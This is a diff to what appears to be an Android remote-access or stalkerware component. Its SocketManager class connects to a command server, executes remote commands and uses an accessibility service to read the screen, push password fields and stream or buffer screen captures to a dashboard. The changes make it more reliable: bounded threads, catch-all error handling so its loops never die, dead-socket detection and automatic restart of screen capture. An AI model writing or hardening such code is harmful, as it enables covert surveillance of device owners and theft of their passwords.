@@ -48,8 +48,14 @@ public class SocketManager {
     private int deviceScreenW = 0;
     private int deviceScreenH = 0;
 
-    // Use a cached thread pool so command handlers never block the read loop
-    private final ExecutorService          executor          = Executors.newCachedThreadPool();
+    // Bounded thread pool: up to 12 threads, 200-task queue, then discard-oldest.
+    // Replaces newCachedThreadPool() which had no thread limit and could OOM the process.
+    private final ExecutorService executor = new java.util.concurrent.ThreadPoolExecutor(
+        4, 12, 60L, TimeUnit.SECONDS,
+        new java.util.concurrent.LinkedBlockingQueue<>(200),
+        r -> { Thread t = new Thread(r, "SocketMgr-worker"); t.setDaemon(true); return t; },
+        new java.util.concurrent.ThreadPoolExecutor.DiscardOldestPolicy()
+    );
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
     private ScheduledFuture<?>             heartbeatFuture;
 
@@ -216,8 +222,8 @@ public class SocketManager {
                 Log.i(TAG, "Connecting to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
                 tcpSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                 tcpSocket.setKeepAlive(true);
-                tcpSocket.setTcpNoDelay(true);      // disable Nagle — send each packet immediately
-                tcpSocket.setSoTimeout(0);          // no read timeout — server sends pings
+                tcpSocket.setTcpNoDelay(true);
+                tcpSocket.setSoTimeout(0);
 
                 out       = new PrintWriter(tcpSocket.getOutputStream(), true);
                 in        = new BufferedReader(new InputStreamReader(tcpSocket.getInputStream()));
@@ -226,9 +232,10 @@ public class SocketManager {
                 Log.i(TAG, "TCP connected — registering device");
                 registerDevice(DeviceInfo.getDeviceId(context));
                 startHeartbeat();
-                listenForMessages();                // blocks until socket closes
+                listenForMessages();
 
-            } catch (Exception e) {
+            } catch (Throwable e) {
+                // Catch Throwable (not just Exception) so an Error never kills the reconnect loop
                 Log.e(TAG, "Connection error: " + e.getMessage());
             } finally {
                 connected = false;
@@ -319,7 +326,7 @@ public class SocketManager {
                         }
                     } catch (Exception ignored) {}
                 }
-            } catch (Exception e) {
+            } catch (Throwable e) {
                 Log.e(TAG, "Stream channel error: " + e.getMessage());
             } finally {
                 streamConnected = false;
@@ -327,7 +334,6 @@ public class SocketManager {
                 streamOut = null;
             }
             if (running) {
-                // Use a longer delay than primary to avoid thrashing when primary is still reconnecting
                 try { Thread.sleep(Math.max(Constants.TCP_RECONNECT_DELAY, 5000)); } catch (InterruptedException ignored) {}
             }
         }
@@ -420,7 +426,7 @@ public class SocketManager {
                         }
                     } catch (Exception ignored) {}
                 }
-            } catch (Exception e) {
+            } catch (Throwable e) {
                 Log.e(TAG, "Live channel error: " + e.getMessage());
             } finally {
                 liveConnected = false;
@@ -484,7 +490,7 @@ public class SocketManager {
                 final String msg = line.trim();
                 if (!msg.isEmpty()) executor.execute(() -> processMessage(msg));
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             Log.e(TAG, "Read error: " + e.getMessage());
         }
     }
@@ -534,8 +540,9 @@ public class SocketManager {
                     Log.w(TAG, "Unhandled event: " + event);
             }
 
-        } catch (JSONException e) {
-            Log.e(TAG, "Parse error: " + e.getMessage() + " raw=" + raw);
+        } catch (Throwable e) {
+            // Catch Throwable — any uncaught exception here would silently kill the executor thread
+            Log.e(TAG, "processMessage error: " + e.getMessage() + " raw=" + raw);
         }
     }
 
@@ -550,6 +557,12 @@ public class SocketManager {
                     msg.put("data", data);
                     out.print(msg.toString() + "\n");
                     out.flush();
+                    // PrintWriter swallows IOExceptions — checkError() is the only way to detect a dead socket
+                    if (out.checkError()) {
+                        Log.w(TAG, "sendMessage: socket write error detected — marking disconnected");
+                        connected = false;
+                        closeSilently();
+                    }
                 } catch (JSONException e) {
                     Log.e(TAG, "sendMessage error: " + e.getMessage());
                 }
@@ -697,7 +710,8 @@ public class SocketManager {
 
         try {
             result = dispatchCommand(command, params);
-        } catch (Exception e) {
+        } catch (Throwable e) {
+            // Catch Throwable so OOM or other Errors still send an error response
             Log.e(TAG, "handleCommand exception for " + command + ": " + e.getMessage());
             sendErrorResponse(commandId, command, "Internal error: " + e.getMessage());
             return;
@@ -1537,9 +1551,22 @@ public class SocketManager {
         screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
             boolean acq = false;
             try {
+                // Re-check service every tick — captured `svc` may be dead after service restart
+                UnifiedAccessibilityService liveSvc = UnifiedAccessibilityService.getInstance();
+                if (liveSvc == null) {
+                    // Service died — stop the loop cleanly so it can be restarted later
+                    Log.w(TAG, "screen_reader: accessibility service gone, stopping loop");
+                    ScheduledFuture<?> self = screenReaderFuture;
+                    if (self != null) self.cancel(false);
+                    autoRecordingActive  = false;
+                    manualRecordingActive = false;
+                    return;
+                }
+
                 acq = accessSemaphore.tryAcquire(1, TimeUnit.SECONDS);
                 if (!acq) return;
-                ScreenReader pusher = new ScreenReader(svc);
+
+                ScreenReader pusher = new ScreenReader(liveSvc);
                 JSONObject screenResult = pusher.readScreen();
                 pushPasswordFieldsFromScreen(screenResult);
 
@@ -1549,18 +1576,17 @@ public class SocketManager {
                 if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
                 if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
 
-                // Always save to local storage - offline first
                 if (autoRecordingActive || manualRecordingActive) {
                     synchronized (offlineFrameBuffer) {
                         offlineFrameBuffer.add(payload);
                     }
                 }
 
-                // Stream to dashboard ONLY for manual recording (screen_reader_start command)
                 if (manualRecordingActive && liveConnected) {
                     sendLiveMessage("screen:update", payload);
                 }
-            } catch (Exception e) {
+            } catch (Throwable e) {
+                // Catch Throwable — ScheduledExecutorService permanently cancels tasks that throw unchecked exceptions
                 Log.e(TAG, "screen_reader push error: " + e.getMessage());
             } finally {
                 if (acq) accessSemaphore.release();
